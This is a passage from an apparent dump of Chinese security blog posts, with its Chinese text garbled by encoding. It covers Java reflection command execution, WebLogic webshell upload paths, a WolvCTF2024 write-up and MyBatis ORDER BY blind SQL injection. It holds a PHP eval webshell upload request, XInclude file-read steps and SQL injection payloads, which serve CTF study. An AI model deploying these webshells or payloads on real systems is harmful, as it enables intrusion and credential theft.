ï¼šåªè¿”å›publicæ„é€ å‡½æ•°\n\nConstructor<?>[] getDeclaredConstructors() ï¼šè¿”å›æ‰€æœ‰æ„é€ å‡½æ•°\n\nConstructor<> getConstructor(ç±»<?>... parameterTypes) : åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„publicæ„é€ å‡½æ•°\n\nConstructor<> getDeclaredConstructor(ç±»<?>... parameterTypes) ï¼š åŒ¹é…å’Œå‚æ•°é…å‹ç›¸ç¬¦çš„æ„é€ å‡½æ•°\n~~~\n\n## å‘½ä»¤æ‰§è¡Œ\n\nè·å– class å®ä¾‹ ä¹‹å\n\n- è·å–ç±»åï¼š`forName()`\n- åˆ›å»ºå¯¹åº”ç±»å‹çš„å®ä¾‹ï¼š`newInstance()`\n- è·å–å­—æ®µçš„å€¼ï¼š`get()`ã€è®¾ç½®å­—æ®µçš„å€¼ï¼š`set()`\n- è·å–æ–¹æ³•ï¼š`getMethod()`ã€è°ƒç”¨æ–¹æ³•ï¼š`invoke()`\n\n---\n\nåŸºæœ¬çŸ¥è¯†å°±æ˜¯è¿™äº›ï¼Œå¦‚ä½•æ‰§è¡Œå‘½ä»¤å‘¢ï¼Œä¸¾ä¸ªä¾‹å­\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class FinalReflectionCalc {\n    public static void main(String[] args) throws Exception{\n        Class c1 = Class.forName(\"java.lang.Runtime\");//åˆ›å»ºä¸€ä¸ªruntimeçš„æ–¹æ³•\n        Method c2 = c1.getDeclaredMethod(\"getRuntime\");//è·å–getRuntimeçš„æ–¹æ³•\n        c2.setAccessible(true);//ä½¿getRuntimeå¯è®¿é—®ï¼Œå› ä¸ºgetRuntimeæ˜¯ç§æœ‰å±æ€§\n        Object o1 = c2.invoke(null);//è°ƒç”¨é™æ€æ–¹æ³•ï¼Œæ— éœ€å®ä¾‹\n        Method m1 = c1.getDeclaredMethod(\"exec\",String.class);//è·å–execæ–¹æ³•\n        m1.invoke(o1,\"calc\");//å¼¹è®¡ç®—å™¨\n    }\n}\n~~~\n\nè¿™æ˜¯è°ƒç”¨é™æ€æ–¹æ³•ï¼Œä¸éœ€è¦å®ä¾‹\n\nå½“ç„¶ä¹Ÿå¯ä»¥å®ç°ä¸€ä¸ªæ–°å®ä¾‹\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class FinalReflectionCalc {\n    public static void main(String[] args) throws Exception{\n        Class c1 = Class.forName(\"java.lang.Runtime\");//è·å–Runtimeçš„Classå¯¹è±¡\n        Constructor c2=c1.getDeclaredConstructor();//è·å–Runtimeç±»çš„æ— å‚æ„é€ å‡½æ•°\n        c2.setAccessible(true);//ä½¿getRuntimeå¯è®¿é—®\n        Object c3=c2.newInstance();//åˆ›å»ºRuntimeçš„æ–°å®ä¾‹\n        Method exec = c1.getDeclaredMethod(\"exec\", String.class);\n        exec.invoke(c3,\"calc\");//å¼¹è®¡ç®—å™¨\n\n    }\n}\n~~~\n\n[Javaååºåˆ—åŒ–åŸºç¡€ç¯‡-02-Javaåå°„ä¸URLDNSé“¾åˆ†æ](https://drun1baby.top/2022/05/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-02-Java%E5%8F%8D%E5%B0%84%E4%B8%8EURLDNS%E9%93%BE%E5%88%86%E6%9E%90/#0x08-%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8)å‚è€ƒé“¾æ¥ï¼Œå†™çš„å¾ˆæ¸…æ™°\n\n[Javaåå°„](https://www.cnblogs.com/noKing/p/9038234.html#/)\n\n---\n\n## Javaåå°„ä¿®æ”¹å­—æ®µ\n\n### private\n\n~~~Java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class PrivateReflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException {\n        Class c = Class.forName(\"src.PrivatePerson\");\n        Object m = c.newInstance();\n        Method PrintMethod = c.getDeclaredMethod(\"printName\");\n        PrintMethod.invoke(m);\n        Field nameField = c.getDeclaredField(\"name\");\n        nameField.setAccessible(true);\n        nameField.set(m, new StringBuilder(\"aaaaa\"));\n        PrintMethod.invoke(m);\n    }\n}\n~~~\n\n~~~java\npackage src;\n\npublic class PrivatePerson {\n    private StringBuilder name = new StringBuilder(\"lll\");\n\n    public void printName() {\n        System.out.println(name);\n    }\n}\n~~~\n\nstaticå•ç‹¬å‡ºç°çš„è¯ï¼Œç”¨getDeclaredFieldä¹Ÿå¯ä»¥\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.InvocationTargetException;\nimport java.lang.reflect.Method;\n\npublic class PrivateReflect {\n    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, NoSuchMethodException, InstantiationException, InvocationTargetException, InvocationTargetException {\n        Class c = Class.forName(\"src.PrivatePerson\");\n        Object m =c.newInstance();\n        Method f = c.getDeclaredMethod(\"printName\");\n        f.invoke(m);\n        Field ff=c.getDeclaredField(\"name\");\n        ff.setAccessible(true);\n        ff.set(m,new StringBuilder(\"lvzhouhang\"));\n        f.invoke(m);\n    }\n}\n~~~\n\n## final\n\nfinal å­—æ®µèƒ½å¦ä¿®æ”¹ï¼Œæœ‰ä¸”å–å†³äºå­—æ®µæ˜¯ç›´æ¥èµ‹å€¼è¿˜æ˜¯é—´æ¥èµ‹å€¼ï¼ˆç¼–è¯‘æ—¶èµ‹å€¼å’Œè¿è¡Œæ—¶èµ‹å€¼çš„åŒºåˆ«ï¼‰ã€‚**ç›´æ¥èµ‹å€¼æ˜¯æŒ‡åœ¨åˆ›å»ºå­—æ®µæ—¶å°±å¯¹å­—æ®µè¿›è¡Œèµ‹å€¼ï¼Œå¹¶ä¸”å€¼ä¸º JAVA çš„ 8 ç§åŸºç¡€æ•°æ®ç±»å‹æˆ–è€… String ç±»å‹ï¼Œè€Œä¸”å€¼ä¸èƒ½æ˜¯ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„ï¼Œå…¶ä»–æƒ…å†µå‡ä¸ºé—´æ¥èµ‹å€¼ã€‚**\n\n### ç›´æ¥èµ‹å€¼\n\n~~~java\npackage src;\n\npublic class FinalStraightPerson {\n\n    private final String name = \"lvzhouhang\";\n    public final int age = 21-1;\n\n    public void printInfo() {\n        System.out.println(name+\" \"+age);\n\n    }\n}\n~~~\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class FinalStraightReflect {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"src.FinalStraightPerson\");\n        Object m = c.newInstance();\n        Method printMethod = c.getDeclaredMethod(\"printInfo\");\n        printMethod.invoke(m);\n\n        Field nameField = c.getDeclaredField(\"name\");\n        Field ageField = c.getDeclaredField(\"age\");\n        nameField.setAccessible(true);\n        ageField.setAccessible(true);\n        nameField.set(m,\"lvzhouhang\");\n        ageField.set(m,\"20\");\n\n        printMethod.invoke(m);\n    }\n}\n~~~\n\nè¿™æ ·é€šè¿‡åå°„ä¿®æ”¹ä¼šæŠ¥é”™\n\n~~~\nException in thread \"main\" java.lang.IllegalArgumentException: Can not set final int field src.FinalStraightPerson.age to java.lang.String\n\tat sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:167)\n\tat sun.reflect.UnsafeFieldAccessorImpl.throwSetIllegalArgumentException(UnsafeFieldAccessorImpl.java:171)\n\tat sun.reflect.UnsafeQualifiedIntegerFieldAccessorImpl.set(UnsafeQualifiedIntegerFieldAccessorImpl.java:100)\n\tat java.lang.reflect.Field.set(Field.java:764)\n\tat src.FinalStraightReflect.main(FinalStraightReflect.java:18)\n~~~\n\nä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\n\nå› ä¸ºJVMåœ¨ç¼–è¯‘æ—¶æœŸ, å°±æŠŠfinalç±»å‹çš„Stringè¿›è¡Œäº†ä¼˜åŒ–, åœ¨ç¼–è¯‘æ—¶æœŸå°±ä¼šæŠŠStringå¤„ç†æˆå¸¸é‡ï¼Œåªè¦æ˜¯è®©nameçš„å€¼ç»è¿‡è¿è¡Œæ‰èƒ½è·å¾—, é‚£ä¹ˆå°±ä¸ä¼šè¢«å¤„ç†ä¸ºå¸¸é‡ã€‚\n\n### é—´æ¥ä¿®æ”¹\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class InDirectReflect {\n    public static void main(String[] args) throws Exception {\n        Class c = Class.forName(\"src.InDirectPerson\");\n        Object m = c.newInstance();\n        Method printMethod = c.getDeclaredMethod(\"printInfo\");\n        printMethod.invoke(m);\n\n        Field nameField = c.getDeclaredField(\"name\");\n        Field ageField = c.getDeclaredField(\"age\");\n        Field sexField = c.getDeclaredField(\"sex\");\n        nameField.setAccessible(true);\n        ageField.setAccessible(true);\n        sexField.setAccessible(true);\n        nameField.set(m,\"lvzhouhang\");\n        ageField.set(m,200);\n        sexField.set(m,new StringBuilder(\"female\"));\n        printMethod.invoke(m);\n    }\n}\n~~~\n\n~~~java\npackage src;\n\npublic class InDirectPerson {\n    private final StringBuilder sex = new StringBuilder(\"male\");\n    // ç»è¿‡é€»è¾‘åˆ¤æ–­äº§ç”Ÿçš„å˜é‡èµ‹å€¼\n    public final int age = (null!=null?20:20);\n    // é€šè¿‡æ„é€ å‡½æ•°è¿›è¡Œèµ‹å€¼\n    private final String name;\n    public InDirectPerson(){\n        name = \"lvzhouhang\";\n    }\n\n    public void printInfo() {\n        System.out.println(name+\" \"+age+\" \"+sex);\n\n    }\n}\n~~~\n\nè¿™æ ·å°±ä¿®æ”¹æˆåŠŸäº†\n\n### static+final\n\n~~~java\npackage src;\n\npublic class finalstaticreflection {\n    private final static StringBuilder name = new StringBuilder(\"lvzhouhang\");\n\n    public void printName() {\n        System.out.println(name);\n    }\n}\n\n~~~\n\n~~~java\npackage src;\n\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\n\npublic class finalstaticflectioncalc {\n    public static void main(String[] args) throws Exception{\n        finalstaticreflection c = new finalstaticreflection();\n        Method m = c.getClass().getDeclaredMethod(\"printName\");\n        m.invoke(c);\n        Field f = c.getClass().getField(\"name\");\n        f.setAccessible(true);\n        f.set(c,new StringBuilder(\"lllllvzhouhang\"));\n        m.invoke(c);\n    }\n\n}\n\n~~~\n\nè¿™æ ·ä½¿ä¿®æ”¹ä¸æˆåŠŸçš„ï¼Œä½†æ˜¯è¿˜æ˜¯å¯ä»¥ä¿®æ”¹ï¼Œé€šè¿‡åå°„å°†nameå­—æ®µå–å‡ºæ¥åå°†finalä¿®é¥°ç¬¦å»æ‰å°±å¯ä»¥ä¿®æ”¹\n\n~~~java\npackage src;\n\nimport com.sun.org.apache.xpath.internal.operations.Mod;\n\nimport java.io.File;\nimport java.lang.reflect.Field;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Modifier;\n\npublic class finalstaticflectioncalc {\n    public static void main(String[] args) throws Exception{\n        finalstaticreflection c = new finalstaticreflection();\n        Method m = c.getClass().getDeclaredMethod(\"printName\");\n        c.printName();\n        Field f = c.getClass().getDeclaredField(\"name\");\n        f.setAccessible(true);\n        Field ff = f.getClass().getDeclaredField(\"modifiers\");\n        ff.setAccessible(true);\n        ff.setInt(f,f.getModifiers() & ~Modifier.FINAL);//å»æ‰finalä¿®é¥°ç¬¦\n        f.set(c,new StringBuilder(\"lllllvzhouhang\"));\n        ff.setInt(f,f.getModifiers() & ~Modifier.FINAL);//åŠ ä¸Šfinalä¿®é¥°ç¬¦\n        c.printName();\n    }\n\n}\n\n~~~\n\nè¿™æ ·å°±æˆåŠŸä¿®æ”¹äº†\n","tags":["JAVA"],"categories":["JAVA"]},{"title":"weblogicä¸Šä¼ é©¬è·¯å¾„é€‰æ‹©","url":"/2024/04/12/weblogicä¸Šä¼ é©¬è·¯å¾„é€‰æ‹©/","content":"\n# [weblogicä¸Šä¼ æœ¨é©¬è·¯å¾„é€‰æ‹©](https://www.cnblogs.com/sstfy/p/10350915.html)\n\nå¯¹äºååºåˆ—åŒ–æ¼æ´ï¼Œå¦‚æœè·å¾—çš„æ˜¯ç³»ç»Ÿæƒé™æˆ–è€…rootæƒé™ï¼Œé‚£å°±æ²¡å¿…è¦ä¸Šä¼ æœ¨é©¬ï¼Œä½†å¦‚æœåªæ˜¯webå®‰è£…åº”ç”¨çš„æƒé™ï¼Œå°±ä¸Šä¼ è·å–æ›´å¤§æƒé™ã€‚\n\nä¸Šä¼ éœ€è¦æ‰¾åˆ°å‡ ä¸ªç‚¹ï¼Œè·å–ç‰©ç†è·¯å¾„ï¼Œå¦‚ä¸‹é¢ä¸‰ç§ï¼š\n\n- **æ–¹æ³•1ï¼šæŠŠshellå†™åˆ°æ§åˆ¶å°imagesç›®å½•ä¸­**\n  `\\Oracle\\Middleware\\wlserver_10.3\\server\\lib\\consoleapp\\webapp\\framework\\skins\\wlsconsole\\images\\shell.jsp` ç›®å½•ä¸Šä¼ æœ¨é©¬ï¼Œ\n  è®¿é—® `http://*.*.*.*:7001/console/framework/skins/wlsconsole/images/shell.jsp`\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100928075-1843904986.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100928075-1843904986.png)\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100936306-699453349.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100936306-699453349.png)\n\n- **æ–¹æ³•2ï¼šå†™åˆ°uddiexplorerç›®å½•ä¸­**\n  `\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\uddiexplorer\\éšæœºå­—ç¬¦\\war\\shell.jsp` ç›®å½•å†™å…¥æœ¨é©¬ï¼Œ\n  è®¿é—® `http://*.*.*.*:7001/uddiexplorer/shell.jsp`\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100944582-1944368429.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100944582-1944368429.png)\n  [![img](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100951748-1087437211.png)](https://img2018.cnblogs.com/blog/981809/201902/981809-20190218100951748-1087437211.png)\n- **æ–¹æ³•3ï¼šåœ¨åº”ç”¨å®‰è£…ç›®å½•ä¸­**\n  `\\Oracle\\Middleware\\user_projects\\domains\\application\\servers\\AdminServer\\tmp\\_WL_user\\é¡¹ç›®å\\éšæœºå­—ç¬¦\\war\\shell.jsp` ç›®å½•å†™å…¥æœ¨é©¬ï¼Œ\n  è®¿é—® `http://*.*.*.*:7001/é¡¹ç›®å/shell.jsp`\n","tags":["web"],"categories":["web"]},{"title":"WolvCTF2024-å¤ç›˜","url":"/2024/03/18/WolvCTF2024-å¤ç›˜/","content":"\n\n\n## Bean Cafe\n\nä»–çš„éªŒè¯é€»è¾‘æ˜¯é€šè¿‡å›¾ç‰‡çš„md5çš„å€¼æ¥éªŒè¯çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¼ ä¸¤å¼ MD5ç›¸åŒçš„å›¾ç‰‡å°±å¯ä»¥è·å¾—flag\n\nhttps://drive.google.com/drive/folders/1eCcMtQkHTreAJT6JmwxG10x1HbT6prY0\n\n## Upload Fun\n\n~~~php\n<?php\n    if($_SERVER['REQUEST_METHOD'] == \"POST\"){\n        if ($_FILES[\"f\"][\"size\"] > 1000) {\n            echo \"file too large\";\n            return;\n        }\n\n        if (str_contains($_FILES[\"f\"][\"name\"], \"..\")) {\n            echo \"no .. in filename please\";\n            return;\n        }\n\n        if (empty($_FILES[\"f\"])){\n            echo \"empty file\";\n            return;\n        }\n\n        $ip = $_SERVER['REMOTE_ADDR'];\n        $flag = file_get_contents(\"/flag.txt\");\n        $hash = hash('sha256', $flag . $ip);\n\n        if (move_uploaded_file($_FILES[\"f\"][\"tmp_name\"], \"./uploads/\" . $hash . \"_\" . $_FILES[\"f\"][\"name\"])) {\n            echo \"upload success\";\n        } else {\n            echo \"upload error\";\n        }\n    } else {\n        if (isset($_GET[\"f\"])) {\n            $path = \"./uploads/\" . $_GET[\"f\"];\n            if (str_contains($path, \"..\")) {\n                echo \"no .. in f please\";\n                return;\n            }\n            include $path;\n        }\n\n        highlight_file(\"index.php\");\n    }\n?>\n~~~\n\né¦–å…ˆåˆ†æä¸€ä¸‹æºç ï¼Œæºç é€šè¿‡POSTæ–¹å¼æ¥ä¸Šä¼ æ–‡ä»¶å¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¸èƒ½åŒ…å«`..`ç”¨GETçš„æ–¹å¼æ¥è¯»å–æ–‡ä»¶ä¹Ÿä¸èƒ½å¸¦æœ‰`..`ï¼Œä¸Šä¼ çš„æ–‡ä»¶åœ¨`uploads`ç›®å½•ä¸‹ï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“`$hash`æ˜¯ä»€ä¹ˆã€‚\n\né€šè¿‡è°·æ­Œå¾—çŸ¥åœ¨linuxç§æ–‡ä»¶åçš„é•¿åº¦æœ€å¤§å¯ä¸º255ä¸ªå­—ç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼è®©å®ƒæŠ¥é”™æ¥å¾—çŸ¥ä»–çš„å€¼\n\n![](./pic/WolvCTF2024/upload.png)\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä»–çš„å›æ˜¾å‘Šè¯‰æˆ‘ä»¬äº†hashçš„å€¼ï¼Œç„¶åæˆ‘ä»¬å†ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è®¿é—®å³å¯ã€‚\n\nPOSTä¸Šä¼ æ–‡ä»¶çš„è¯·æ±‚ä½“æ¨¡æ¿:\n\n~~~\nPOST / HTTP/2\nHost: \nCache-Control: max-age=0\nSec-Ch-Ua: \"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"\nSec-Ch-Ua-Mobile: ?0\nSec-Ch-Ua-Platform: \"Windows\"\nUpgrade-Insecure-Requests: 1\nOrigin: https://0ad900b10331bc6f843fbff300b80018.web-security-academy.net\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundarylZktl8pLMuKyOfBy\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: navigate\nSec-Fetch-User: ?1\nSec-Fetch-Dest: document\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nContent-Length: 198\n\n------WebKitFormBoundarylZktl8pLMuKyOfBy\nContent-Disposition: form-data; name=\"\"; filename=\"\"\nContent-Type: \n\n\n<?php eval($_POST['1'])?>\n------WebKitFormBoundarylZktl8pLMuKyOfBy\n~~~\n\n## Username\n\né¢˜ç›®æç¤ºäº†jwtå¯ä»¥çˆ†ç ´ï¼Œé‚£è¿™é“é¢˜è‚¯å®šå’Œjwtä¼ªé€ æœ‰å…³ã€‚\n\nç”¨jwt-crackerçˆ†ç ´å¯†é’¥ï¼Œä¸º`mstzt`\n\nå› ä¸ºæœ‰<data>æ ‡ç­¾ï¼Œæ‰€ä»¥åˆ¤æ–­ä¸ºxxeæ³¨å…¥ï¼Œä½†æ˜¯æ­£å¸¸çš„xxeä»–ä¼šæœ‰è¿‡æ»¤ï¼Œä¸èƒ½å¼•ç”¨ä¸œè¥¿ã€‚å¯ä»¥ä½¿ç”¨`XInclude attack`å…³äº[XInclude attack](https://d0pt3x.gitbook.io/passion/webapp-security/xxe-attacks/xinclude-attacks)\n\nè¯»å–/app/app.pyæ–‡ä»¶\n\n~~~python\nimport flask\nfrom flask import Flask, render_template, request, url_for\nimport jwt\nfrom lxml import etree\nimport os\nimport re\nimport tempfile\n\napp = Flask(__name__)\n\nFLAG = os.environ.get('FLAG') or 'wcft{fake-flag}'\nFLAGUSER_PASSWORD = os.environ.get('FLAGUSER_PASSWORD') or 'fake-password'\n\nJWT_SECRET = os.environ.get('JWT_SECRET') or 'secret'\n\nJWT_ALG = 'HS256'\nJWT_COOKIE = 'appdata'\n\n\n@app.route('/')\ndef root():\n    return render_template(\"index.html\")\n\n\n@app.route('/secret-welcome-935734', methods=['GET'])\ndef secret_welcome():\n    # There is a linux user named 'flaguser'\n    # Login here with that username and their linux password.\n    auth = request.authorization\n\n    if auth is None or auth.username != 'flaguser' or auth.password != FLAGUSER_PASSWORD:\n        resp = flask.Response('Please provide the right credentials to get the flag')\n        resp.headers['WWW-Authenticate'] = 'Basic'\n        return resp, 401\n\n    return f'Congrats, here is your flag: {FLAG}'\n\n\n@app.route('/welcome', methods=['GET'])\ndef welcome():\n    cookie = request.cookies.get(JWT_COOKIE)\n\n    if not cookie:\n        return f'Error: missing {JWT_COOKIE} cookie value'\n\n    try:\n        jwtData = jwt.decode(cookie, JWT_SECRET, algorithms=[JWT_ALG])\n    except:\n        return 'Error: unable to decode JWT cookie', 400\n\n    data = jwtData['data']\n    if not data:\n        return 'Error: missing data field from decoded JWT', 400\n\n    xmlText = str(data)\n    if '&' in xmlText:\n        return 'Error: No entity references please', 400\n    if '%' in xmlText:\n        return 'Error: No parameter file entities please', 400\n\n    tmp = tempfile.NamedTemporaryFile()\n\n    # Open the file for writing.\n    with open(tmp.name, 'w') as f:\n        f.write(xmlText)\n\n    try:\n        parser = etree.XMLParser(resolve_entities=False)\n        xmlDoc = etree.parse(tmp.name, parser=parser)\n        xmlDoc.xinclude()\n    except Exception as e:\n        print('XML Error:', e)\n        return 'Error: Error parsing XML', 400\n\n\n    usernameElement = xmlDoc.find('username')\n    if usernameElement is None:\n        return 'Error: Missing username element in XML', 400\n\n    username = usernameElement.text\n\n    return render_template(\"welcome.html\", username=username)\n\n\n@app.route('/register', methods=['POST'])\ndef register():\n    username = request.form.get('username')\n\n    if not username:\n        return 'Error: username is required', 400\n\n    username = str(username)\n\n    if not re.match('^[a-z] $', username):\n        return 'Error: username must be only lowercase letters', 400\n\n    if len(username) < 3:\n        return 'Error: username must be at least 3 letters', 400\n\n    if len(username) > 20:\n        return 'Error: username must be no longer than 20 letters', 400\n\n    # Useful for chal development\n    # username = '<xi:include xmlns:xi=\"http://www.w3.org/2001/XInclude\" href=\"/app/app.py\" parse=\"text\"/>'\n    xml = f'<data><username>{username}</username></data>'\n\n    jwtData = {\"data\": xml}\n\n    cookie = jwt.encode(jwtData, JWT_SECRET, algorithm=JWT_ALG)\n\n    response = flask.make_response(f'hello {username}')\n    response.set_cookie(JWT_COOKIE, cookie)\n\n    response.headers['location'] = url_for('welcome')\n    return response, 302\n\nif __name__ == \"__main__\":\n    app.run(debug=False)\n~~~\n\nåœ¨è¿™ä¸ªæ–‡ä»¶é‡Œå¯ä»¥å¾—çŸ¥ï¼Œæœ‰ä¸€ä¸ªæ–°çš„è·¯ç”±`/secret-welcome-935734`åœ¨è¿™é‡Œç™»é™†æˆåŠŸåå¾—åˆ°flagï¼Œç”¨æˆ·åä¸º`flaguser`ï¼Œå¯†ç æˆ‘ä»¬å¯ä»¥ç”¨xxeè¯»å–`/etc/passwdæˆ–è€…/etc/shadow`åœ¨shadowä¸­æˆ‘ä»¬å¾—çŸ¥å¯†ç ä¸º`$1$hack$BzqsFHqkPjQ2Sn9amFsgN0`è¿™ä¸ªå¯ä»¥åˆ©ç”¨`hashcat`çˆ†ç ´\n\nå…³äºhashcatçš„ç”¨æ³•[](https://www.jianshu.com/p/9909ce4c9e7c)\n\nçˆ†ç ´å‡ºæ¥å¯†ç æ˜¯`qqz3`ç™»å½•å¾—åˆ°flag\n","tags":["ctf"],"categories":["ctf","å¤ç›˜"]},{"title":"javaæ³¨å…¥å­¦ä¹ ","url":"/2024/03/16/javaæ³¨å…¥å­¦ä¹ /","content":"\n\n\n## JDBC\n\n### JDBCæ˜¯ä»€ä¹ˆ\n\n**J**ava **D**ata**B**ase **C**onnectivityï¼ˆJavaè¯­è¨€è¿æ¥æ•°æ®åº“ï¼‰\n\n| æ¥å£æˆ–ç±»                 | ä½œç”¨                                                     |\n| ------------------------ | -------------------------------------------------------- |\n| **DriverManagerç±»**      | 1)ç®¡ç†å’Œæ³¨å†Œæ•°æ®åº“é©±åŠ¨<br />2)å¾—åˆ°æ•°æ®åº“è¿æ¥å¯¹è±¡         |\n| **Connectionæ¥å£**       | ä¸€ä¸ªè¿æ¥å¯¹è±¡ï¼Œå¯ç”¨äºåˆ›å»ºStatementå’ŒPreparedStatementå¯¹è±¡ |\n| **Statemenæ¥å£**         | ä¸€ä¸ªSQLè¯­å¥å¯¹è±¡ï¼Œç”¨äºå°†SQLè¯­å¥å‘é€ç»™æ•°æ®åº“æœåŠ¡å™¨         |\n| **PreparedStetemenæ¥å£** | ä¸€ä¸ªSQLè¯­å¥å¯¹è±¡ï¼Œæ˜¯Statemençš„å­æ¥å£                      |\n| **ResultSetæ¥å£**        | ç”¨äºå°è£…æ•°æ®åº“æŸ¥è¯¢çš„ç»“æœé›†ï¼Œè¿”å›ç»™æ•°æ®åº“Javaç¨‹åº         |\n\n| åŠ è½½å’Œæ³¨å†Œé©±åŠ¨çš„æ–¹æ³•                | æè¿°                                                         |\n| ----------------------------------- | ------------------------------------------------------------ |\n| **Class.forName(æ•°æ®åº“é©±åŠ¨å®ç°ç±»)** | åŠ è½½å’Œæ³¨å†Œæ•°æ®åº“é©±åŠ¨ï¼Œæ•°æ®åº“é©±åŠ¨ç”±mysqlå‚å•†\"com.mysql.jbdc.Driver\" |\n\nPrepareStatementä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ï¼Œä½†å¦‚æœç›´æ¥é‡‡å–æ‹¼æ¥çš„æ–¹å¼æ„é€ SQLï¼Œæ­¤æ—¶è¿›è¡Œé¢„ç¼–è¯‘ä¹Ÿæ— ç”¨ã€‚\n\nStatementä¸ä¼šå¯¹SQLè¯­å¥è¿›è¡Œé¢„ç¼–è¯‘ã€‚\n\nä¸¤ç§æ“ä½œéƒ½æ˜¯å› ä¸ºSQLè¯­å¥æ‹¼æ¥å¯¼è‡´çš„SQLæ³¨å…¥ã€‚\n\n## MyBatisæ¡†æ¶\n\nåœ¨mybatisä¸­çš„ï¼Œä½¿ç”¨`#`åŒ…è£¹çš„å­—æ®µåœ¨å†…éƒ¨è¿›è¡Œäº†é¢„ç¼–è¯‘å¤„ç†ï¼Œè€Œ`$`å¹¶æ²¡æœ‰ä½¿ç”¨é¢„ç¼–è¯‘ï¼Œä¹Ÿå°±æ˜¯JDBCä¸­prepareStatementå’ŒStatementçš„åŒºåˆ«ã€‚mybatisçš„sqlè¯­å¥é€šå¸¸æ˜¯å†™åœ¨xmlæ–‡ä»¶ä¸­ã€‚\n\n### order by ç›²æ³¨\n\nåœ¨SQLä¸­æ˜¯ä¸å…è®¸unionç›´æ¥è·Ÿåœ¨order byåé¢çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ç›²æ³¨æˆ–æŠ¥é”™æ³¨å…¥ã€‚\n\næˆ‘çš„ç†è§£å°±æ˜¯é€šè¿‡order byå°†åˆ—è¿›è¡Œæ’åºï¼Œé€šè¿‡è¿”å›çš„ä¸åŒç»“æœ\n\nä¸¾ä¸ªç®€å•çš„ä¾‹å­:\n\n~~~mysql\nMariaDB [test]> select * from user order by (if(substr((select username from user limit 0,1),1,1)='1',sleep(1),1));\n+------------------+------------+\n| username         | password   |\n+------------------+------------+\n| Nakajima Ayato   | 9CXLGSEWDO |\n| Mildred Green    | r8ZPbvDXBC |\n| Ito Momoe        | qao7ysP90D |\n| Lo On Kay        | x8rGVqTQqd |\n| Kobayashi Sakura | lYiv7UO8Yo |\n+------------------+------------+\n5 rows in set (0.002 sec)\n\nMariaDB [test]> select * from user order by (if(substr((select username from user limit 0,1),1,1)='N',sleep(1),1));\n+------------------+------------+\n| username         | password   |\n+------------------+------------+\n| Nakajima Ayato   | 9CXLGSEWDO |\n| Mildred Green    | r8ZPbvDXBC |\n| Ito Momoe        | qao7ysP90D |\n| Lo On Kay        | x8rGVqTQqd |\n| Kobayashi Sakura | lYiv7UO8Yo |\n+------------------+------------+\n5 rows in set (5.004 sec)\n~~~\n\nå¯ä»¥çœ‹åˆ°ï¼Œå½“ifè¯­å¥æˆç«‹æ—¶è¿”å›çš„æ—¶é—´ä¸º5sï¼Œä½†æ˜¯ä¸æˆç«‹æ—¶ä¸º0.002s\n\nè¿™æ˜¯åŸºäºæ—¶é—´çš„ç›²æ³¨ã€‚\n\nè¿˜å¯ä»¥åˆ©ç”¨å…¶å®ƒçš„æ–¹å¼æ¥è¿›è¡Œç›²æ³¨\n\nä¾‹å¦‚ï¼š\n\n```sql\nMariaDB [test]> select * from user order by if(substr((select username from user limit 0,1),1,1)='a',1,(select host from mysql.user));\nERROR 1242 (21000): Subquery returns more than 1 row\n```\n\nå¦‚æœifè¯­å¥é”™è¯¯å°±ä¼šè¿”å›`ERROR 1242 (21000): Subquery returns more than 1 